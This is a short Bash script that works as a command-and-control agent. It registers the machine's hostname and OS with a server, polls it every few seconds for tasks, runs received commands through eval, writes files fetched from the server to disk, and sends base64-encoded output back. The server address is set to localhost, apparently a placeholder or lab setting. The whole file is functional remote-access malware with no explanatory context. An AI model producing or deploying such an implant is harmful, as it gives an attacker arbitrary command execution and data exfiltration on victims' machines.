#!/bin/bash

IP="127.0.0.1"
PORT=8080
server="$IP:$PORT"

encode_base64() {
    echo -n "$1" | base64 -w 0
}

hname=$(hostname)
source /etc/os-release
os="${NAME// /_}_${VERSION_ID}"

reg_json="{\"hostname\": \"$hname\", \"os\": \"$os\"}"

response=$(curl -s -X POST http://$server/reg \
     -H "Content-Type: application/json" \
     -d "$reg_json")

name=$(echo "$response" | grep -o '"name":"[^"]*"' | cut -d':' -f2 | tr -d '"')

while true; do
    response=$(curl -s -X GET http://$server/tasks/$name)
    
    if [ -n "$response" ] && [ "$response" != "null" ]; then
        command=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d':' -f2 | tr -d '"')
        task_id=$(echo "$response" | grep -o '"id":[0-9]*' | cut -d':' -f2)
        output=""

        if [ "$command" = "quit" ]; then
            output="Agent exiting."
            encoded_output=$(encode_base64 "$output")
            results_json="{\"task_id\":$task_id, \"agent_name\":\"$name\", \"output\":\"$encoded_output\"}"
            curl -s -X POST http://$server/results/$name \
                -H "Content-Type: application/json" \
                -d "$results_json"
            exit

        elif [[ "$command" == exec* ]]; then
            cmd_to_run="${command#exec }"
            output=$(eval "$cmd_to_run" 2>&1)

        elif [[ "$command" == download* ]]; then
            filename="${command#download }"
            file_content=$(curl -s http://$server/download/$filename)
            if [ -z "$file_content" ]; then
                output="Error: File not found or empty."
            else
                echo "$file_content" > "$filename"
                output="File saved: $filename"
            fi
        fi

        if [ -n "$output" ]; then
            encoded_output=$(encode_base64 "$output")
            results_json="{\"task_id\":$task_id, \"agent_name\":\"$name\", \"output\":\"$encoded_output\"}"
            curl -s -X POST http://$server/results/$name \
                -H "Content-Type: application/json" \
                -d "$results_json"
        fi
    fi

    sleep 3
done
